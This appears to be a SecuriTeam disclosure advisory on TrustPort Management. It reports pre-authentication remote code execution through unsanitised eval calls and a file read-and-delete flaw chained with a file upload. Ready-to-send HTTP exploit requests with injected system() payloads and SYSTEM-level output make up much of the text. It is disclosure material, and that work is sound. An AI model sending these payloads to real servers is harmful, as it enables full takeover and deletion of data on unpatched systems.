**Vulnerability Summary**<br>
Multiple vulnerabilities in TrustPort’s management product allow remote unauthenticated attackers to cause the product to execute arbitrary code.
TrustPort Management “offers you an effective and practical way to install centrally, configure and update antivirus software in your network and it enables mass administration of TrustPort products. Central administration from TrustPort brings you simple application of corporate security policies, monitoring of security incidents or the remote starting of tasks”.

**Vendor Response**<br>
The vulnerability was reported to the vendor on March 6th, the following response was received on the 6th of March:
“thanks for information. We are going to correct the errors in following version of the SW.”
No further response was received, though 3 more emails were sent by us to the company between the March 6th and the date of publication. We have no idea of how to resolve this bug, the only workaround is to not expose the administrative port to untrusted networks.

**Credit**<br>
An independent security researcher, Ahmed Y. Elmogy, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Vulnerability Details**<br>
1. Pre-auth remote code execution vulnerability (as SYSTEM) in https://host:20394/get/settings-set-user.php.
Requirements: No authentication is required to exploit this vulnerability.
Vulnerable lines 25 to 29:
```
foreach($_POST AS $key=>$val) {
  # Do objektu nastrkame hodnoty, ktere jsme ziskali s POSTu
  $evalcode .= '$data->users->user->'.$key.'->data = \''.$val.'\';';
}
@eval($evalcode);
```

No validation is being done on user input before using eval on it.
Exploitation request:

```
POST /get/settings-set-users.php HTTP/1.1
Host: VULNERABLE_HOST:20394
Connection: close
Content-Length: 177
Origin: https://VULNERABLE_HOST:20394
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: https://VULNERABLE_HOST:20394/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
action=update&id=&enabled=on&login=admin';system('whoami');//&loginpass=&loginpass2=&firstname=built-in&surname=administrator&email=&lang=ENU
```

Response:

```
nt authority\system
({"success":"false",
        "vipperResult":"-2700",
        "resultDesc":"ER_TPM_AUTHENTICATION_FAILED"
      })
```

2. Pre-auth remote code execution vulnerability (as SYSTEM) in https://host:20394/get/settings-set-user-perms.php
Requirements: No authentication is required to exploit this vulnerability.
Vulnerable lines 16 to 25:

```
$evalcode = '';
foreach($_POST AS $key=>$val) {
  if (preg_match('/hide\|perms\|/',$key)) {
    $key = str_replace('|','->',preg_replace('/hide\|perms\|/','',$key));
    $evalcode .= '$permdata->userpolicies->permissions->'.$key.'->data = \''.$val.'\';';
  }
  $evalcode .= '$permdata->userpolicies->permissions->attr[\'rights\'] = \''.$_POST['rights'].'\';';
  $evalcode .= '$permdata->userpolicies->permissions->attr[\'id\'] = \''.$_POST['id'].'\';';
}
@eval($evalcode);
```

No validation is being done on user input before using eval on it.
Exploitation request:

```
POST /get/settings-set-user-perms.php HTTP/1.1
Host: VULNERABLE_HOST:20394
Connection: close
Content-Length: 41
Origin: https://VULNERABLE_HOST:20394
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: https://VULNERABLE_HOST:20394/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
id=test';system('whoami');//&rights=admin
```

Response:

```
nt authority\system
({"success":"false",
        "vipperResult":"-2700",
        "resultDesc":"ER_TPM_AUTHENTICATION_FAILED"
        })
```

3. Pre-auth remote arbitrary file disclosure/deletion in https://host:20394/get/manage-get-stations-add.php<br>
Requirements: No authentication is required to exploit this vulnerability, requires combination with another minor vulnerability to be exploitable.<br>
Restrictions: The file disclosed will be deleted after that, unless the “exploiter” manages somehow to race the PHP code before that happens (I doubt).<br>
Vulnerable code, line 74 to 76:

```
case "download":
  export_download_file($_GET['key']);
  break;
```

Where export_download_file is:

```
function export_download_file($filename) {
  $path = ini_get('upload_tmp_dir').'\\'.$filename;
  $filename = file_get_contents($path);
  ob_end_clean();
  header('Content-type: application/download');
  header('Content-Disposition: attachment; filename="export.csv"');
  header('Content-transfer-encoding: binary');
  header('Content-Length: '.filesize($filename));
  readfile($filename);
  unlink($path);
  unlink($filename);
}
```

So this couldn’t be directly exploited because it actually views the contents of the path, that’s written in a file (idk what could be the purpose of this function), but I found another minor file upload vulnerability (no .php extensions) that helps exploiting this. In /get/settings-set-backup.php.<br>
Vulnerable code:
```
} else if ($_POST['action'] == 'upload' ) {
  $viperpath = '/control/command/backup/upload/';
  $send = "false";
  $vipperResult = "0";
  // kontrola existence nahravaneho souboru
  if(empty($_FILES['restore_file']['tmp_name']))
    die('{"success":"false",
          "vipperResult":"-3",
          "resultDesc":"ER_FILE_NOT_FOUND"
         }');
  // cesta k nahranemu souboru
  $tmpName = realpath(dirname(__FILE__) . '/../../tmp/').'\\restore_bkp_'.$_SESSION['useruid'];
  copy($_FILES['restore_file']['tmp_name'], $tmpName);
```

This requires no authentication, and will create file restore_bkp_ (as _SESSION[‘useruid’] would be null) with whatever content we want (the path we want to disclose and consequently delete of course).
Exploitation requests:

```
POST /get/settings-set-backup.php HTTP/1.1
Host: VULNERABLE_HOST:20394
Connection: close
Content-Length: 306
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://VULNERABLE_HOST:20394
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rzvt7fRozJ1TlNT
Referer: https://VULNERABLE_HOST:20394/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
------WebKitFormBoundary6rzvt7fRozJ1TlNT
Content-Disposition: form-data; name="restore_file"; filename="exploit.txt"
Content-Type: text/plain
C:\private.txt
------WebKitFormBoundary6rzvt7fRozJ1TlNT
Content-Disposition: form-data; name="action"
upload
------WebKitFormBoundary6rzvt7fRozJ1TlNT--
```

Then to disclose/delete the contents of C:\private.txt:

```
GET /get/manage-get-stations-add.php?action=download&key=restore_bkp_ HTTP/1.1
Host: VULNERABLE_HOST:20394
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
```

And response:

```
HTTP/1.1 200 OK
Date: Sun, 04 Mar 2018 18:02:26 GMT
Set-Cookie: GUISESSID=cc025911b45268643cbeb8e87aa30cc3; path=/
Pragma:
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Sun, 04 Mar 2018 18:02:26 GMT
Cache-Control: post-check=0, pre-check=0, false
Content-type: application/download
Content-Disposition: attachment; filename="export.csv"
Content-transfer-encoding: binary
Content-Length: 21
This is private data.
```
